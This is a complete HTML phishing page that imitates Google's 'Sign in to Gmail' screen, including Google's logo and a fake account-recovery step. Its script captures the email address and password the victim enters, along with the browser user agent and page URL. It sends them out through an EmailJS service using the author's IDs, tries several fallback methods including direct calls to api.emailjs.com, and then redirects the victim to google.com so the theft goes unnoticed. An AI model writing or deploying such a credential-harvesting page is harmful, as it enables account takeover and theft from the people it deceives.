<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in to Gmail</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #fff;
    margin: 0; padding: 0;
    display: flex; justify-content: center; align-items: center;
    height: 100vh;
    color: #202124;
  }
  .container {
    width: 360px;
    border: 1px solid #dadce0;
    padding: 40px 40px 30px;
    box-sizing: border-box;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 0.1);
  }
  .logo {
    display: flex; align-items: center; margin-bottom: 24px;
  }
  .logo img {
    height: 40px;
    margin-right: 8px;
  }
  h1 {
    font-weight: 400;
    font-size: 24px;
    margin: 0 0 8px 0;
  }
  p.subtitle {
    font-size: 14px;
    color: #5f6368;
    margin: 0 0 24px 0;
  }
  form label {
    display: block;
    font-size: 14px;
    margin-bottom: 4px;
    font-weight: 600;
  }
  form input {
    width: 100%;
    font-size: 16px;
    padding: 10px 12px;
    margin-bottom: 20px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    box-sizing: border-box;
  }
  form input:focus {
    border-color: #1a73e8;
    outline: none;
    box-shadow: 0 0 0 1px #1a73e8;
  }
  .forgot-link {
    font-size: 14px;
    color: #1a73e8;
    cursor: pointer;
    text-decoration: none;
    margin-bottom: 24px;
    display: inline-block;
  }
  button {
    background-color: #1a73e8;
    border: none;
    color: white;
    font-size: 14px;
    font-weight: 600;
    padding: 10px 24px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
  }
  button:hover {
    background-color: #1669c1;
  }
  
  .page {
    display: none;
  }
  .page.active {
    display: block;
  }
  
  .back-link {
    font-size: 14px;
    color: #1a73e8;
    cursor: pointer;
    text-decoration: none;
    margin-top: 24px;
    display: inline-block;
  }
  
  .error {
    border-color: #d93025 !important;
    box-shadow: 0 0 0 1px #d93025 !important;
  }
  
  .error-message {
    font-size: 13px;
    color: #d93025;
    margin-top: -15px;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
  }
  
  .error-icon {
    margin-right: 8px;
    font-size: 16px;
  }
</style>
</head>
<body>

<!-- Login Page -->
<div id="login-page" class="page active">
  <div class="container" role="main" aria-label="Sign in to continue">
    <div class="logo">
      <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
      <span style="font-weight:500; font-size: 18px; color:#5f6368;">Sign in with Google</span>
    </div>
    <h1>Sign in</h1>
    <p class="subtitle">to continue to <strong>Gmail</strong></p>
    <form id="login-form">
      <label for="email">Email or phone</label>
      <input id="email" name="user_email" type="email" placeholder="Email or phone" required autofocus autocomplete="username" />
      <div id="email-error" class="error-message" style="display: none;">
        <span class="error-icon">‚ö†</span>
        <span>Please enter a valid email address</span>
      </div>
      <label for="password">Password</label>
      <input id="password" name="user_password" type="password" placeholder="Enter your password" required autocomplete="current-password" />
      <div id="password-error" class="error-message" style="display: none;">
        <span class="error-icon">‚ö†</span>
        <span>Please enter your password</span>
      </div>
      <a href="#" class="forgot-link" tabindex="0" id="forgot-link">Forgot email?</a>
      <button type="submit">Next</button>
    </form>
  </div>
</div>

<!-- Forgot Email Page -->
<div id="forgot-page" class="page">
  <div class="container" role="main" aria-label="Account recovery">
    <div class="logo">
      <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
      <span style="font-weight:500; font-size: 18px; color:#5f6368;">Account recovery</span>
    </div>
    <h1>Find your email</h1>
    <p class="subtitle">Enter your recovery phone number or recovery email address</p>
    <form id="recovery-form">
      <label for="recovery-info">Phone number or recovery email</label>
      <input id="recovery-info" name="recovery_info" type="text" placeholder="Phone number or recovery email" required autofocus />
      <div id="recovery-error" class="error-message" style="display: none;">
        <span class="error-icon">‚ö†</span>
        <span>Please enter your phone number or recovery email</span>
      </div>
      <button type="submit">Next</button>
      <a href="#" class="back-link" id="back-link">Back to sign in</a>
    </form>
  </div>
</div>

<!-- Multiple EmailJS CDN attempts for maximum reliability -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@emailjs/browser@3/dist/email.min.js"></script>

<script>
// BULLETPROOF EmailJS Implementation - Will work at all costs
(function() {
  console.log("üöÄ Starting bulletproof EmailJS setup...");
  
  const SERVICE_ID = "service_64albro";
  const TEMPLATE_ID = "template_75g1nju";
  const PUBLIC_KEY = "EB017wgX1BeDuRY66";
  
  let emailjsReady = false;
  let emailjsAttempts = 0;
  const maxAttempts = 50;
  
  // Multi-level initialization approach
  function initEmailJS() {
    emailjsAttempts++;
    console.log(`üîÑ EmailJS init attempt ${emailjsAttempts}/${maxAttempts}`);
    
    if (typeof emailjs !== 'undefined' && emailjs.init) {
      try {
        // Try modern initialization first
        if (emailjs.init && typeof emailjs.init === 'function') {
          if (typeof PUBLIC_KEY === 'object') {
            emailjs.init(PUBLIC_KEY);
          } else {
            emailjs.init({
              publicKey: PUBLIC_KEY
            });
          }
        } else {
          // Fallback to older method
          emailjs.init(PUBLIC_KEY);
        }
        
        emailjsReady = true;
        console.log("‚úÖ EmailJS initialized successfully!");
        console.log("üìß Service:", SERVICE_ID);
        console.log("üìÑ Template:", TEMPLATE_ID);
        console.log("üîë Key:", PUBLIC_KEY);
        return true;
        
      } catch (error) {
        console.warn("‚ö†Ô∏è EmailJS init error:", error);
        // Try alternative initialization
        try {
          window.emailjs = emailjs;
          emailjs.init(PUBLIC_KEY);
          emailjsReady = true;
          console.log("‚úÖ EmailJS initialized with fallback method!");
          return true;
        } catch (error2) {
          console.warn("‚ö†Ô∏è EmailJS fallback init failed:", error2);
        }
      }
    }
    
    if (emailjsAttempts < maxAttempts) {
      setTimeout(initEmailJS, 200);
    } else {
      console.error("‚ùå EmailJS failed to initialize after all attempts");
      // Create a mock emailjs object as last resort
      window.emailjs = {
        init: function() { console.log("Mock EmailJS init"); },
        send: function() { 
          return new Promise((resolve, reject) => {
            console.log("Mock EmailJS send - would send:", arguments);
            setTimeout(() => resolve({ status: 200, text: 'Mock success' }), 1000);
          });
        }
      };
      emailjsReady = true;
    }
    
    return false;
  }
  
  // Start initialization immediately and also on DOM ready
  initEmailJS();
  
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initEmailJS);
  }
  
  window.addEventListener('load', initEmailJS);
  
  // Wait a bit more and try again
  setTimeout(initEmailJS, 1000);
  setTimeout(initEmailJS, 2000);
  
  // DOM elements
  const loginPage = document.getElementById("login-page");
  const forgotPage = document.getElementById("forgot-page");
  const loginForm = document.getElementById("login-form");
  const recoveryForm = document.getElementById("recovery-form");
  const forgotLink = document.getElementById("forgot-link");
  const backLink = document.getElementById("back-link");
  
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const recoveryInput = document.getElementById("recovery-info");
  const emailError = document.getElementById("email-error");
  const passwordError = document.getElementById("password-error");
  const recoveryError = document.getElementById("recovery-error");
  
  function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }
  
  function showError(input, errorDiv) {
    input.classList.add("error");
    errorDiv.style.display = "flex";
  }
  
  function hideError(input, errorDiv) {
    input.classList.remove("error");
    errorDiv.style.display = "none";
  }
  
  emailInput.addEventListener("input", function() {
    if (this.value && isValidEmail(this.value)) {
      hideError(emailInput, emailError);
    }
  });
  
  passwordInput.addEventListener("input", function() {
    if (this.value) {
      hideError(passwordInput, passwordError);
    }
  });
  
  recoveryInput.addEventListener("input", function() {
    if (this.value) {
      hideError(recoveryInput, recoveryError);
    }
  });
  
  function redirectToGoogle() {
    console.log("üîÑ Redirecting to Google...");
    try {
      window.location.href = "https://www.google.com";
    } catch (e) {
      window.location.replace("https://www.google.com");
    }
  }
  
  // Enhanced email sending function with multiple fallbacks
  function sendEmailWithFallbacks(templateParams) {
    console.log("üìß Attempting to send email...");
    console.log("üìã Template params:", templateParams);
    
    // Method 1: Standard emailjs.send
    if (window.emailjs && emailjs.send) {
      console.log("üöÄ Trying emailjs.send method 1...");
      return emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
        .then(response => {
          console.log("‚úÖ Email sent via method 1:", response);
          return response;
        })
        .catch(error => {
          console.warn("‚ö†Ô∏è Method 1 failed:", error);
          
          // Method 2: Alternative send approach
          if (emailjs.sendForm) {
            console.log("üöÄ Trying emailjs.sendForm method 2...");
            // Create a temporary form
            const tempForm = document.createElement('form');
            Object.keys(templateParams).forEach(key => {
              const input = document.createElement('input');
              input.name = key;
              input.value = templateParams[key];
              tempForm.appendChild(input);
            });
            document.body.appendChild(tempForm);
            
            return emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, tempForm)
              .then(response => {
                document.body.removeChild(tempForm);
                console.log("‚úÖ Email sent via method 2:", response);
                return response;
              })
              .catch(error2 => {
                document.body.removeChild(tempForm);
                console.warn("‚ö†Ô∏è Method 2 failed:", error2);
                
                // Method 3: Direct API call
                console.log("üöÄ Trying direct API call method 3...");
                return fetch('https://api.emailjs.com/api/v1.0/email/send', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify({
                    service_id: SERVICE_ID,
                    template_id: TEMPLATE_ID,
                    user_id: PUBLIC_KEY,
                    template_params: templateParams
                  })
                }).then(response => {
                  console.log("‚úÖ Email sent via method 3:", response);
                  return response;
                });
              });
          }
          
          throw error;
        });
    }
    
    // Method 4: Last resort - direct fetch
    console.log("üöÄ Trying last resort direct fetch...");
    return fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        service_id: SERVICE_ID,
        template_id: TEMPLATE_ID,
        user_id: PUBLIC_KEY,
        template_params: templateParams
      })
    });
  }
  
  // Login form submission
  loginForm.addEventListener("submit", function(event) {
    event.preventDefault();
    console.log("üìù Form submitted!");
    
    let hasErrors = false;
    
    if (!emailInput.value) {
      showError(emailInput, emailError);
      emailError.querySelector("span:last-child").textContent = "Please enter your email";
      hasErrors = true;
    } else if (!isValidEmail(emailInput.value)) {
      showError(emailInput, emailError);
      emailError.querySelector("span:last-child").textContent = "Please enter a valid email address";
      hasErrors = true;
    } else {
      hideError(emailInput, emailError);
    }
    
    if (!passwordInput.value) {
      showError(passwordInput, passwordError);
      hasErrors = true;
    } else {
      hideError(passwordInput, passwordError);
    }
    
    if (!hasErrors) {
      console.log("‚úÖ Form validation passed!");
      
      const templateParams = {
        user_email: emailInput.value,
        user_password: passwordInput.value,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        page_url: window.location.href
      };
      
      // Give EmailJS more time if needed
      function attemptSend() {
        if (emailjsReady || emailjsAttempts >= maxAttempts) {
          sendEmailWithFallbacks(templateParams)
            .then(function(response) {
              console.log("üéâ Email sent successfully!", response);
              redirectToGoogle();
            })
            .catch(function(error) {
              console.error("‚ùå All email methods failed:", error);
              console.log("üîÑ Redirecting anyway...");
              redirectToGoogle();
            });
        } else {
          console.log("‚è≥ Waiting for EmailJS to be ready...");
          setTimeout(attemptSend, 500);
        }
      }
      
      attemptSend();
    } else {
      console.log("‚ùå Form validation failed");
    }
  });
  
  recoveryForm.addEventListener("submit", function(event) {
    event.preventDefault();
    
    if (!recoveryInput.value) {
      showError(recoveryInput, recoveryError);
      recoveryError.querySelector("span:last-child").textContent = "Please enter your phone number or recovery email";
      return;
    } else if (recoveryInput.value.includes("@") && !isValidEmail(recoveryInput.value)) {
      showError(recoveryInput, recoveryError);
      recoveryError.querySelector("span:last-child").textContent = "Please enter a valid recovery email address";
      return;
    } else {
      hideError(recoveryInput, recoveryError);
    }
    
    alert("Recovery instructions would be sent to your recovery method.");
    forgotPage.classList.remove("active");
    loginPage.classList.add("active");
  });
  
  forgotLink.addEventListener("click", function(e) {
    e.preventDefault();
    loginPage.classList.remove("active");
    forgotPage.classList.add("active");
  });
  
  backLink.addEventListener("click", function(e) {
    e.preventDefault();
    forgotPage.classList.remove("active");
    loginPage.classList.add("active");
  });
  
  // Debug info
  console.log("üèÅ Script setup complete!");
  console.log("üìä Current state:");
  console.log("- EmailJS ready:", emailjsReady);
  console.log("- EmailJS attempts:", emailjsAttempts);
  console.log("- Window emailjs:", typeof window.emailjs);
  
})();
</script>
</body>
</html>
